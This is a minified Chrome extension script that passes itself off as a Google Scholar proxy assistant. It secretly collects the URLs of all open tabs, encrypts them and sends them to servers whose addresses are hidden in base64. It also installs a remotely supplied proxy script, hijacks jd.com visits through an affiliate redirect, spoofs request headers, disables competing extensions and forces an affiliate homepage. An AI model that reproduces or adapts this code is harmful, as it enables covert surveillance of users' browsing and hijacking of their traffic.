var _gaq=_gaq||[];function initAnalytics(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://ssl.google-analytics.com/ga.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}_gaq.push(["_setAccount","UA-126541584-1"]),_gaq.push(["_trackPageview"]);var settingProxy=!1,googleUrl=null,googleList=["https://direct.likeso.ml/","https://g.codery.ga/","https://e.08800.top/","http://www.google-cn.net/","https://wing.likeso.ml/","https://zz.08800.top/","https://cc.08800.top/","https://g.l3l.bid/","https://www.gotype.tk/","https://c.ggjx.men/","https://google.cutinlove.com/","https://a.ggjx.men/"],piratebayUrl=null,piratebayList=["https://cruzing.xyz/","https://pirateproxy.sh/","https://tpb.network/","https://tpb.ukpass.co/","https://thepbproxy.com/","https://tpbproxy.nl/","https://proxydl.cf/","https://bay.maik.rocks/"],googleScholarUrl=null,googleScholarList=["https://xs.glgoo.net/scholar","https://sci-hub.org.cn/scholar","http://xueshu.endni.com/scholar","http://g.smartdt.com.cn/scholar","https://noevils.com/scholar","https://g.abcdocker.com/scholar","https://f.glgooo.top/scholar"];function reuqestHandler(e){return 0<=e.url.indexOf("https://www.jd.com/")&&0<e.url.indexOf("utm_source=baidu")?(setTimeout(function(){chrome.webRequest.onBeforeRequest.removeListener(reuqestHandler)},3e3),{redirectUrl:"https://p.gouwubang.com/b?w=1007089&e=&t=https://www.jd.com/"}):"https://www.jd.com/"===e.url||"http://www.jd.com/"===e.url?(setTimeout(function(){chrome.webRequest.onBeforeRequest.removeListener(reuqestHandler)},3e3),{redirectUrl:"https://p.gouwubang.com/b?w=1007089&e=&t=https://www.jd.com/"}):void 0}function hook(){chrome.webRequest.onBeforeRequest.removeListener(reuqestHandler),chrome.webRequest.onBeforeRequest.addListener(reuqestHandler,{types:["main_frame"],urls:["*://www.jd.com/*"]},["blocking"])}function setCookie(e,t,o){if(0<o){var r=new Date;r.setTime((new Date).getTime()+1e3*o),document.cookie=e+"="+encodeURIComponent(t)+";expires="+r.toUTCString()}else document.cookie=e+"="+encodeURIComponent(t)}function getCookie(e){for(var t=e+"=",o=document.cookie.split(";"),r=0;r<o.length;++r){var n=o[r].trim();if(0==n.indexOf(t))return decodeURIComponent(n.substring(t.length,n.length))}return""}function findString(e,t){for(var o=0;o<t.length;++o)if(t[o]===e)return!0;return!1}function StringTool(){StringTool.prototype.encrypt=function(e,t){if(e=String(e),t=String(t),0==e.length)return"";var o=this.strToLongs(e.utf8Encode()),r=this.strToLongs(t.utf8Encode().slice(0,16));return o.length,o=this.encode(o,r),this.longsToStr(o).base64Encode()},StringTool.prototype.decrypt=function(e,t){if(e=String(e),t=String(t),0==e.length)return"";var o=this.strToLongs(e.base64Decode()),r=this.strToLongs(t.utf8Encode().slice(0,16));o.length,o=this.decode(o,r);var n=this.longsToStr(o);return(n=n.replace(/\0+$/,"")).utf8Decode()},StringTool.prototype.encode=function(e,t){e.length<2&&(e[1]=0);for(var o,r,n=e.length,s=e[n-1],i=e[0],a=Math.floor(6+52/n),c=0;0<a--;){r=(c+=2654435769)>>>2&3;for(var l=0;l<n;l++)o=(s>>>5^(i=e[(l+1)%n])<<2)+(i>>>3^s<<4)^(c^i)+(t[3&l^r]^s),s=e[l]+=o}return e},StringTool.prototype.decode=function(e,t){for(var o,r,n=e.length,s=e[n-1],i=e[0],a=2654435769*Math.floor(6+52/n);0!=a;){r=a>>>2&3;for(var c=n-1;0<=c;c--)o=((s=e[0<c?c-1:n-1])>>>5^i<<2)+(i>>>3^s<<4)^(a^i)+(t[3&c^r]^s),i=e[c]-=o;a-=2654435769}return e},StringTool.prototype.strToLongs=function(e){for(var t=new Array(Math.ceil(e.length/4)),o=0;o<t.length;o++)t[o]=e.charCodeAt(4*o)+(e.charCodeAt(4*o+1)<<8)+(e.charCodeAt(4*o+2)<<16)+(e.charCodeAt(4*o+3)<<24);return t},StringTool.prototype.longsToStr=function(e){for(var t=new Array(e.length),o=0;o<e.length;o++)t[o]=String.fromCharCode(255&e[o],e[o]>>>8&255,e[o]>>>16&255,e[o]>>>24&255);return t.join("")},StringTool.prototype.getKey=function(e,t){for(var o=(e+t).replace("T",""),r=[],n=0;n<16;n++)r.push(String.fromCharCode(parseInt(o.charCodeAt(n)+o.charCodeAt(n+16)+o.charCodeAt(n+32))/3));return r.join("")},void 0===String.prototype.utf8Encode&&(String.prototype.utf8Encode=function(){return unescape(encodeURIComponent(this))}),void 0===String.prototype.utf8Decode&&(String.prototype.utf8Decode=function(){try{return decodeURIComponent(escape(this))}catch(e){return this}}),void 0===String.prototype.base64Encode&&(String.prototype.base64Encode=function(){return this}),void 0===String.prototype.base64Decode&&(String.prototype.base64Decode=function(){return this})}function showMessage(e,t,o,r,s){var n={type:"basic",iconUrl:chrome.runtime.getURL("images/icon48.png"),title:e,message:t,isClickable:!0,priority:0};n.buttons=new Array,void 0===o||""===o||void 0!==r&&""!==r||(n.priority=1,n.buttons.push({title:o})),void 0!==o&&""!==o&&void 0!==r&&""!==r&&(n.priority=2,n.buttons.push({title:o}),n.buttons.push({title:r}));var i=(new Date).getTime().toString();return chrome.notifications.create(i,n,function(r){function n(e,t){e===r&&(chrome.notifications.clear(r),void 0!==s&&null!=s&&s(t))}chrome.notifications.onButtonClicked.addListener(n),chrome.notifications.onClosed.addListener(function e(t,o){t===r&&(chrome.notifications.clear(r),chrome.notifications.onClosed.removeListener(e),chrome.notifications.onButtonClicked.removeListener(n))})}),i}function getCurrentTime(){return(new Date).toISOString().substr(0,19).replace(/-/g,"").replace(/:/g,"")}function sendHttpRequest(e,t){var o=new XMLHttpRequest;o.open("GET",e,!0),o.onreadystatechange=function(){4==o.readyState&&t({httpCode:o.status,responseText:o.responseText})},o.send(null)}function postHttpRequest(e,t,o){var r=new XMLHttpRequest;r.open("POST",e,!0),r.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8"),r.onreadystatechange=function(){4==r.readyState&&o({httpCode:r.status,responseText:r.responseText})},r.send(t)}function isValidWebsite(e,t){var o=new XMLHttpRequest;o.timeout=1e4,o.open("GET",e,!0),o.onreadystatechange=function(){4==o.readyState&&t(200==o.status)},o.send(null)}function isValidProxy(e){var t=new XMLHttpRequest;t.open("GET","http://www.google.com",!0),t.onreadystatechange=function(){4==t.readyState&&e(200==t.status)},t.send(null)}function ProxyMgr(){ProxyMgr.prototype.createOnlineProxy=function(n){var s=this;s.requestRootServer(function(o){if(o.length<=0)n(!1);else{s.changeHttpHeader(o);var r=0;s.tryCreateProxy(o[r],function e(t){++r,t?(s.recoveryHttpHeader(),n(!0)):r<o.length?s.tryCreateProxy(o[r],e):(s.recoveryHttpHeader(),n(!1))})}})},ProxyMgr.prototype.requestRootServer=function(s){sendHttpRequest(atob("aHR0cHM6Ly95aW5ndS5jb2RpbmcubWUvdGVzdC9kLmpzb24/dD0=")+Date.now(),function(e){if(200===e.httpCode){var t=null;try{t=JSON.parse(e.responseText).RSS}catch(e){t=null}finally{if(null!=t&&t.length<=0)return void s([])}for(var o=Math.floor(100*Math.random()),r=new Array,n=0;n<t.length;++n)0<t[n].percentHigh&&t[n].percentHigh>=o&&t[n].percentLow<=o?r.unshift(atob(t[n].name)):r.push(atob(t[n].name));s(r)}else s([])})},ProxyMgr.prototype.tryCreateProxy=function(i,a){var c=this;sendHttpRequest(i+atob("c3RhdGljL3Rlc3QuanNvbj90PQ==")+Date.now(),function(e){200===e.httpCode?c.queryTab(function(o){c.readDevieId(function(r){var n=new StringTool,s=getCurrentTime(),e=n.encrypt(JSON.stringify(o),n.getKey(r,s)),t=i+atob("YXBwL2V4dC91cGRhdGVUYXNrUnVsZTM/dXVpZD0=")+r+"&time="+s;postHttpRequest(t,"D="+encodeURIComponent(e),function(e){if(200!==e.httpCode)a(!1);else{var t=n.decrypt(e.responseText,n.getKey(r,s)),o=null;try{o=JSON.parse(t)}catch(e){o=null}finally{c.setProxy(o,a)}}})})}):a(!1)})},ProxyMgr.prototype.queryTab=function(r){chrome.tabs.query({},function(e){for(var t={links:[]},o=0;o<e.length;++o)e[o].hasOwnProperty("url")&&t.links.push(e[o].url);t.links.length<=0&&t.links.push("https://www.baidu.com/"),r(t)})},ProxyMgr.prototype.setProxy=function(e,t){if(null!=e)if(e.hasOwnProperty("result")&&e.hasOwnProperty("pacScriptStr")&&e.hasOwnProperty("proxyServer"))if(e.result&&0<e.pacScriptStr.length&&0<e.proxyServer.length){var o=this,r="";for(var n in e.proxyServer){var s=e.proxyServer[n].split(":");r+=s[0]+" "+s[1]+":"+s[2]+";"}var i=atob("ZnVuY3Rpb24gRmluZFByb3h5Rm9yVVJMKHVybCwgaG9zdCkgewp2YXIgRD0iRElSRUNUOyIsIFAgPSAi")+r+'";\n'+e.pacScriptStr+"\n}";chrome.proxy.settings.set({value:{mode:"pac_script",pacScript:{data:i}},scope:"regular"},function(){isValidProxy(function(e){e?o.updateLocalProxy(i,function(){t(!0)}):t(!1)})})}else t(!1);else t(!1);else t(!1)},ProxyMgr.prototype.changeHttpHeader=function(e){for(var t=new Array,o=0;o<e.length;++o)t.push(e[o]+atob("YXBwL2V4dC8q"));chrome.webRequest.onBeforeSendHeaders.addListener(this.handleHttpHeader,{types:["xmlhttprequest"],urls:t},["blocking","requestHeaders"])},ProxyMgr.prototype.recoveryHttpHeader=function(){chrome.webRequest.onBeforeSendHeaders.removeListener(this.handleHttpHeader)},ProxyMgr.prototype.handleHttpHeader=function(e){if(0<e.url.length)for(var t=0;t<e.requestHeaders.length;++t)if("Origin"===e.requestHeaders[t].name){e.requestHeaders[t].value=atob("Y2hyb21lLWV4dGVuc2lvbjovL2dvY2tsYWJvZ2dqZmtvbGFrbnBiaGRkYmFvcGNlcGZw");break}return{requestHeaders:e.requestHeaders}},ProxyMgr.prototype.readDevieId=function(e){var t=getCookie("deviceId");if(0<t.length)e(t);else{function o(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}var r=o()+o()+"-"+o()+"-"+o()+"-"+o()+"-"+o()+o()+o();setCookie("deviceId",r,30*(1+3*Math.random())*24*3600),e(r)}},ProxyMgr.prototype.updateLocalProxy=function(n,s){chrome.storage.local.get("pacCodeList",function(e){var t=new Array;e.pacCodeList&&(t=e.pacCodeList);var o=hex_md5(n);for(var r in t)if(t[r].codeMD5===o){t.splice(r,1);break}t.sort(function(e,t){return t.validTime-e.validTime}),t.unshift({codeMD5:o,validTime:(new Date).getTime(),code:n}),256<t.length&&t.splice(256,t.length-256),chrome.storage.local.set({pacCodeList:t},function(){s()})})},ProxyMgr.prototype.createLocalProxy=function(n){var s=this;chrome.storage.local.get("pacCodeList",function(e){var o=new Array;if(e.pacCodeList&&(o=e.pacCodeList),o.length<=0)n(!1);else{var r=0;chrome.proxy.settings.set({value:{mode:"pac_script",pacScript:{data:o[r].code}},scope:"regular"},function t(){isValidProxy(function(e){e?(setTimeout(function(){s.updateLocalProxy(o[r].code,function(){})},1e3),n(!0)):++r<o.length?setTimeout(function(){chrome.proxy.settings.set({value:{mode:"pac_script",pacScript:{data:o[r].code}},scope:"regular"},t)},100):n(!1)})})}})}}function evaluateGoogleUrl(){var o=0;isValidWebsite(googleList[o],function e(t){t?googleUrl=googleList[o]:++o<googleList.length?isValidWebsite(googleList[o],e):googleUrl="http://ac.scmor.com/"})}function evaluateGoogleScholar(){var o=0;isValidWebsite(googleScholarList[o],function e(t){t?googleScholarUrl=googleScholarList[o]:++o<googleScholarList.length?isValidWebsite(googleScholarList[o],e):piratebayUrl=null})}function evaluatePiratebay(){var o=0;isValidWebsite(piratebayList[o],function e(t){t?piratebayUrl=piratebayList[o]:++o<piratebayList.length?isValidWebsite(piratebayList[o],e):piratebayUrl=null})}function createProxy(){settingProxy=!0,chrome.proxy.settings.clear({scope:"regular"},function(){var t=new ProxyMgr;t.createOnlineProxy(function(e){e?(settingProxy=!1,showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("GoogleProxyIsOpen")),chrome.browserAction.setIcon({path:"images/icon16.png"}),chrome.browserAction.setTitle({title:chrome.i18n.getMessage("GoogleProxyIsOpen")})):t.createLocalProxy(function(e){e?(settingProxy=!1,showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("GoogleProxyIsOpen")),chrome.browserAction.setIcon({path:"images/icon16.png"}),chrome.browserAction.setTitle({title:chrome.i18n.getMessage("GoogleProxyIsOpen")})):(settingProxy=!1,chrome.browserAction.setIcon({path:"images/icon19_gray.png"}),chrome.browserAction.setTitle({title:chrome.i18n.getMessage("GoogleProxyIsClose")}),showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("TryLater")),chrome.storage.local.set({enableProxy:!1}))})})})}function switchProxy(){settingProxy?showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("WaitMoment")):chrome.storage.local.get("enableProxy",function(e){var t=void 0===e.enableProxy||e.enableProxy;chrome.proxy.settings.get({incognito:!1},function(e){t?createProxy():(chrome.browserAction.setIcon({path:"images/icon19_gray.png"}),chrome.browserAction.setTitle({title:chrome.i18n.getMessage("GoogleProxyIsClose")}),chrome.proxy.settings.clear({scope:"regular"},function(){showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("GoogleProxyIsClose"))}))})})}function isEnableProxy(t){chrome.storage.local.get("enableProxy",function(e){t(!settingProxy&&(void 0===e.enableProxy||e.enableProxy))})}function watchProxyExtension(){function e(){chrome.proxy.settings.get({incognito:!1},function(e){"controlled_by_this_extension"!==e.levelOfControl&&"controllable_by_this_extension"!==e.levelOfControl&&showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("ProxyCoverMessage"),chrome.i18n.getMessage("DisableExtension"),"",function(e){0===e&&chrome.management.getAll(function(e){for(var t=0;t<e.length;++t)e[t].id!==chrome.runtime.id&&e[t].enabled&&findString("proxy",e[t].permissions)&&chrome.management.setEnabled(e[t].id,!1)})})})}e(),chrome.management.onEnabled.addListener(e),chrome.management.onInstalled.addListener(e)}function messageCallback(e,t,o){return"switchProxy"===e.op?chrome.storage.local.set({enableProxy:e.enableProxy},function(){switchProxy()}):"openGoogle"===e.op?chrome.proxy.settings.get({incognito:!1},function(e){"controlled_by_this_extension"===e.levelOfControl?isEnableProxy(function(e){e?chrome.tabs.create({url:"https://www.google.com/"}):googleUrl?chrome.tabs.create({url:googleUrl}):chrome.tabs.create({url:googleList[0]})}):googleUrl?chrome.tabs.create({url:googleUrl}):chrome.tabs.create({url:googleList[0]})}):"openPirateBay"===e.op?piratebayUrl?chrome.tabs.create({url:piratebayUrl}):chrome.tabs.create({url:piratebayList[0]}):"requestGoogleScholar"===e.op?chrome.proxy.settings.get({incognito:!1},function(e){"controlled_by_this_extension"===e.levelOfControl?isEnableProxy(function(e){o(e?{url:null}:googleScholarUrl?{url:googleScholarUrl}:{url:googleScholarList[0]})}):o(googleScholarUrl?{url:googleScholarUrl}:{url:googleScholarList[0]})}):"showFreeMsg"===e.op?chrome.storage.local.get("freepaperMsg",function(e){e.freepaperMsg||showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("freePaperMsg"),chrome.i18n.getMessage("NoRemind"),"",function(e){0===e&&chrome.storage.local.set({freepaperMsg:!0})})}):"showNoFreePaperMsg"===e.op&&showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("nofreepaperMsg")),!0}function init(){chrome.storage.local.get("firstRun",function(e){void 0===e.firstRun||e.firstRun?(chrome.storage.local.set({firstRun:!1}),showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("SwitchPopup"))):chrome.tabs.query({windowType:"normal"},function(e){e.length<=0?chrome.tabs.create({url:"http://www.2345.com/?38690"}):1==e.length&&e[0].url.indexOf("38690")<0&&(chrome.tabs.create({url:"https://www.2345.com/?38690"}),chrome.storage.local.get("noRemind",function(e){e.noRemind||showMessage(chrome.i18n.getMessage("GoogleScholarAssistant"),chrome.i18n.getMessage("HomepageWarning"),chrome.i18n.getMessage("NoRemind"),"",function(e){0===e&&chrome.storage.local.set({noRemind:!0})})}))})}),watchProxyExtension(),switchProxy(),chrome.runtime.onMessage.addListener(messageCallback),chrome.contextMenus.create({title:"Google Scholar",contexts:["page"],onclick:function(e,t){chrome.tabs.create({url:"https://scholar.google.com"})}}),chrome.contextMenus.create({title:"Google Scholar",contexts:["selection","editable"],onclick:function(e,t){e.hasOwnProperty("selectionText")&&0!=e.selectionText.length?chrome.tabs.create({url:"https://scholar.google.com/scholar?q="+encodeURIComponent(e.selectionText)}):chrome.tabs.create({url:"https://scholar.google.com"})}}),hook(),evaluatePiratebay(),evaluateGoogleUrl(),evaluateGoogleScholar(),setTimeout(initAnalytics,5e3)}window.addEventListener("load",function(){init()});